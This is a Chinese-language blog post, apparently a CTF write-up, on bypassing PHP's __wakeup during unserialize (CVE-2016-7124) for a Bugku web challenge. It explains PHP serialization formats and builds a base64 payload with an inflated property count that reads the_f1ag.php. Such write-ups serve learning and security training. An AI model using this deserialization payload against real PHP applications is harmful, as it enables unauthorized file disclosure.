@@ -1,0 +1,211 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PHP反序列化绕过__wakeup | LowBee's Blog</title><meta name="keywords" content="反序列化"><meta name="author" content="Low Bee"><meta name="copyright" content="Low Bee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目地址： newbugku web24 CVE-2016-7124(绕过__wakeup)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化绕过__wakeup">
+<meta property="og:url" content="http://lowbee.fun/2020/08/11/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup/index.html">
+<meta property="og:site_name" content="LowBee&#39;s Blog">
+<meta property="og:description" content="题目地址： newbugku web24 CVE-2016-7124(绕过__wakeup)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png">
+<meta property="article:published_time" content="2020-08-11T12:23:14.000Z">
+<meta property="article:modified_time" content="2021-04-25T12:57:31.276Z">
+<meta property="article:author" content="Low Bee">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://lowbee.fun/2020/08/11/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-197495331-1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-197495331-1');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-04-25 20:57:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/头像.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">70</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LowBee's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化绕过__wakeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-08-11T12:23:14.000Z" title="Created 2020-08-11 20:23:14">2020-08-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-04-25T12:57:31.276Z" title="Updated 2021-04-25 20:57:31">2021-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">788</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>3min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP反序列化绕过__wakeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>题目地址：</p>
+<p>newbugku <a target="_blank" rel="noopener" href="http://123.206.31.85:10024/">web24</a></p>
+<p><strong>CVE-2016-7124(绕过__wakeup)</strong></p>
+<span id="more"></span>
+<ul>
+<li>查看源码，在末尾发现文件所在位置：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/20200811203430.png" alt=""></p>
+<ul>
+<li>
+<p>访问该文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Small_white_rabbit</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the_f1ag.php </span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    @unserialize(<span class="variable">$var</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由此可知，此处考察PHP的反序列化知识：简单分析过后，需要构造指向目标文件的对象，将其序列化后，再base64编码即可。</p>
+<p>常见方法如下：</p>
+<blockquote>
+<p>(1) __construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。</p>
+<p>(2) __wakeup() ：unserialize()时会自动调用</p>
+<p>(3) __destruct()：当对象被销毁时会自动调用。</p>
+<p>(4) __toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</p>
+<p>(5) __get() :当从不可访问的属性读取数据</p>
+<p>(6) __call(): 在对象上下文中调用不可访问的方法时触发</p>
+</blockquote>
+</li>
+<li>
+<p>问题所在：<code>__wakeup()</code>会在<code>unserilize()</code>之前被调用，而且会修改目标文件。</p>
+</li>
+<li>
+<p>序列化问题：</p>
+<blockquote>
+<p>不同属性的序列化结果不同。</p>
+<p>Public属性序列化后格式:成员名</p>
+<p>Private属性序列化后格式:%00类名%00成员名</p>
+<p>Protected属性序列化后的格式:%00*%00成员名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;lowbee&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">88</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$income</span> = <span class="string">&quot;-10000&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> user();</span><br><span class="line">print_r(serialize(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于显示问题，无法显示<code>%00</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;lowbee&quot;;s:6:&quot; * age&quot;;i:88;s:12:&quot; user income&quot;;s:6:&quot;-10000&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>因此在此题目中更要解决<code>%00</code>的base编码问题。</p>
+</blockquote>
+</li>
+<li>
+<p>绕过__wakeup：</p>
+<p>影响版本：<strong>PHP5 &lt; 5.6.25  PHP7 &lt; 7.0.10</strong></p>
+<p>漏洞原因：如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示<strong>对象属性个数的值大于真实的属性个数</strong>时会跳过__wakeup的执行</p>
+</li>
+<li>
+<p>构造Payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Small_white_rabbit</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the_f1ag.php </span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$myinput</span>=<span class="keyword">new</span> Small_white_rabbit(<span class="string">&quot;the_f1ag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$myinput</span>));</span><br></pre></td></tr></table></figure>
+<p>此处没有改变结果中属性个数，结果(1)如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoxOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>再次构造改变属性个数结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Small_white_rabbit</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$temp</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the_f1ag.php </span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$myinput</span>=<span class="keyword">new</span> Small_white_rabbit(<span class="string">&quot;the_f1ag.php&quot;</span>);</span><br><span class="line"><span class="comment">//print_r(serialize($myinput));</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$myinput</span>));</span><br></pre></td></tr></table></figure>
+<p>结果(2)如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7czoyNDoiAFNtYWxsX3doaXRlX3JhYmJpdAB0ZW1wIjtzOjk6ImluZGV4LnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>因为只需要改变结果(1)中的个数，因此将其与结果(2)从头对比可知：</p>
+<p>结果(1):TzoxODoiU21hbGxfd2hpdGVfcmFiYml0Ijo<strong>x</strong>…</p>
+<p>结果(2):TzoxODoiU21hbGxfd2hpdGVfcmFiYml0Ijo<strong>y</strong>…</p>
+<p>将结果(1)的x位置改变y即可。</p>
+<p>最终Payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Low Bee</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://lowbee.fun/2020/08/11/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup/">http://lowbee.fun/2020/08/11/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/08/29/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Misc-压缩包</div></div></a></div><div class="next-post pull-right"><a href="/2020/07/20/MAMP-4/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">MAMP-4</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/头像.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Low Bee</div><div class="author-info__description">科研废物</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">70</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">40</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lowbee2019"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lowbee2019" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:lowbee@vip.qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">社会主义接班人！</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/20/Paper-33/" title="ClusterGAN: Latent Space Clustering in Generative Adversarial Networks"><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ClusterGAN: Latent Space Clustering in Generative Adversarial Networks"/></a><div class="content"><a class="title" href="/2021/12/20/Paper-33/" title="ClusterGAN: Latent Space Clustering in Generative Adversarial Networks">ClusterGAN: Latent Space Clustering in Generative Adversarial Networks</a><time datetime="2021-12-20T02:47:34.000Z" title="Created 2021-12-20 10:47:34">2021-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/26/Reinforcement-Learning-ZouWei-3/" title="Reinforcement Learning ZouWei(III)"><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/f5d6603125a166875ed1666ca908e45b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reinforcement Learning ZouWei(III)"/></a><div class="content"><a class="title" href="/2021/11/26/Reinforcement-Learning-ZouWei-3/" title="Reinforcement Learning ZouWei(III)">Reinforcement Learning ZouWei(III)</a><time datetime="2021-11-26T01:26:30.000Z" title="Created 2021-11-26 09:26:30">2021-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/25/Reinforcement-Learning-ZouWei-2/" title="Reinforcement Learning ZouWei(II)"><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/f5d6603125a166875ed1666ca908e45b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reinforcement Learning ZouWei(II)"/></a><div class="content"><a class="title" href="/2021/11/25/Reinforcement-Learning-ZouWei-2/" title="Reinforcement Learning ZouWei(II)">Reinforcement Learning ZouWei(II)</a><time datetime="2021-11-25T11:24:14.000Z" title="Created 2021-11-25 19:24:14">2021-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/22/Reinforcement-Learning-ZouWei-1/" title="Reinforcement Learning ZouWei(I)"><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/f5d6603125a166875ed1666ca908e45b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reinforcement Learning ZouWei(I)"/></a><div class="content"><a class="title" href="/2021/11/22/Reinforcement-Learning-ZouWei-1/" title="Reinforcement Learning ZouWei(I)">Reinforcement Learning ZouWei(I)</a><time datetime="2021-11-22T13:46:09.000Z" title="Created 2021-11-22 21:46:09">2021-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/17/Paper-32/" title="Federated Evaluation of On-device Personalization"><img src="https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Federated Evaluation of On-device Personalization"/></a><div class="content"><a class="title" href="/2021/06/17/Paper-32/" title="Federated Evaluation of On-device Personalization">Federated Evaluation of On-device Personalization</a><time datetime="2021-06-17T13:07:02.000Z" title="Created 2021-06-17 21:07:02">2021-06-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/lowbee2019/PicGo@master/img/default.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Low Bee</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas 